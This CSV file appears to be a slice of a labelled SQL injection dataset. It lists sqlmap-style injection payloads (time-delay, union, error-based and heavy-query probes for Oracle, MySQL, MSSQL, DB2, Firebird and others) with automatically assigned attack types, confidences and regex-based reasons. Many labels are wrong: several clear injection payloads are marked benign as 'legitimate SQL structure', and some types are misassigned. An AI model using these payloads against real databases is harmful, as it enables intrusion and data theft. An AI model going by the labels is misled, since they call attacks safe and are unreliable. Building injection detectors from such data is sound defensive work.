id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25085,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( '%' = '",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25086,"1 ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25087,-2154%' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25088,"-4317"" ) ) as nxvn where 2566 = 2566 union all select 2566,2566,2566#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25089,-9434' ) union all select 3106#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25090,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 8535 = 8535",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25091,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25092,select ( case when ( 8601 = 1220 ) then 8601 else 8601* ( select 8601 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25093,"1%' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( '%' = '",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25094,"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""umne"" like ""umne",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25095,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25096,"1%"" union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25097,1 where 3027 = 3027 and 4595 = 4595#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25098,"1 ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 3326 = 3326",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25099,"1"" ) and elt ( 4249 = 4249,7259 ) and ( ""xgka"" like ""xgka",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25100,"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25101,1 ) as obzn where 7652 = 7652 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25102,"-4127%' union all select 9558,9558,9558#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25103,"1"" ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25104,-4208%' ) ) ) or 1133 = 9010--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25105,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'yqzg' = 'yqzg",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25106,1'+ ( select vfmy where 5711 = 5711,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25107,1'|| ( select 'ldad' where 6146 = 6146 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) ||',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25108,1' ) ) ) and 2006 = 2006,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25109,-9100 ) or 8792 = 9550--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25110,"1"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25111,"1 and elt ( 3172 = 7243,7243 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25112,"-9613"" ) ) ) or elt ( 3125 = 7084,7084 ) and ( ( ( ""pupl"" = ""pupl",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25113,"1' ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25114,"1'+ ( select sged where 1181 = 1181 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25115,"1' ) ) ) union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25116,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'mcrt' = 'mcrt,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25117,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) --",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25118,"1' in boolean mode ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25119,"-4679 where 9634 = 9634 union all select 9634,9634,9634,9634,9634,9634,9634--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25120,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25121,1' where 2967 = 2967,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25122,"1 ) where 5598 = 5598 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25123,"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""zoag"" like ""zoag",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25124,select sleep ( 5 ) # yrpn,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25125,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25126,"1%"" ) union all select null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25127,"-6548%"" ) union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25128,-5352%' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25129,1 where 8135 = 8135,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25130,"1"" ) ) as turj where 1237 = 1237",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25131,1'|| ( select 'gdzt' where 4950 = 4950,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25132,"1"" ) ) as nncz where 2331 = 2331",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25133,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25134,"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'eimq' = 'eimq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25135,"1"" waitfor delay '0:0:5' and ""syhx"" = ""syhx",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25136,"-8667'+ ( select ymmg where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25137,"1' where 9605 = 9605 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25138,-2223' ) ) as mjwp where 8650 = 8650 or 7900 = 5838,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25139,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'ibrj' = 'ibrj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25140,select ( case when ( 6843 = 2657 ) then 6843 else 6843* ( select 6843 from information_schema.character_sets ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25141,"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'pufu' like 'pufu",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25142,"1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""ytju"" like ""ytju",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25143,1 ) ) as qlkf where 6635 = 6635,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
